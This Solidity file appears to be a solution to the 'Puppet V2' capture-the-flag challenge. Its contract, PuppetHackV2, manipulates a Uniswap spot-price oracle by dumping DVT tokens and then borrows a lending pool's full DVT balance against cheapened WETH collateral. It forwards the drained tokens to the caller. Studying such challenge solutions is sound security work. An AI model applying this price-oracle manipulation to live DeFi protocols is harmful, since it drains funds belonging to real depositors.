// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IUniswap {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function WETH() external pure returns (address);
}

interface Itoken {
    function permit(
        address owner,
        address spender,
        uint value,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external returns (bool success);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IPool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(
        uint256 tokenAmount
    ) external view returns (uint256);
}

contract PuppetHackV2 {
    IUniswap public uniswap;
    Itoken public token;
    Itoken public wEth;
    IPool public pool;

    constructor(
        address _uinswap,
        address _token,
        address _wEth,
        address _pool
    ) payable {
        uniswap = IUniswap(_uinswap);
        token = Itoken(_token);
        wEth = Itoken(_wEth);
        pool = IPool(_pool);
    }

    function Hack() external {
        // Swap the entire 10000DVT balance for WETH, creating a very imbalanced ration in the exchange
        // Attacker must transfer DVT tokens to this contract before initiating the attack. this contract will gain about 9.9WETH in this swap
        uint256 initialAttackerBalance = token.balanceOf(address(this));

        token.approve(address(uniswap), initialAttackerBalance);
        // swping
        address[] memory pathDVTtoETH = new address[](2);
        pathDVTtoETH[0] = address(token);
        pathDVTtoETH[1] = uniswap.WETH();

        uniswap.swapExactTokensForTokens(
            initialAttackerBalance,
            1,
            pathDVTtoETH,
            address(this),
            block.timestamp + 300
        );

        // execute borrow because Price has been manipulated
        uint256 poolBalance = token.balanceOf(address(pool));
        uint256 depositedRequired = pool.calculateDepositOfWETHRequired(
            poolBalance
        );

        wEth.approve(address(pool), depositedRequired);
        pool.borrow(poolBalance);

        // revert the price to avoid any arbitrage opportunity
        uint256 finalWethBalance = wEth.balanceOf(address(this));
        wEth.approve(address(uniswap), finalWethBalance);
        address[] memory wethToDvt = new address[](2);
        wethToDvt[0] = uniswap.WETH();
        wethToDvt[1] = address(token);

        uniswap.swapExactTokensForTokens(
            finalWethBalance,
            1,
            wethToDvt,
            address(this),
            block.timestamp + 300
        );

        // send ALL DVT back to the attacker
        token.transfer(msg.sender, token.balanceOf(address(this)));
        
    }
}
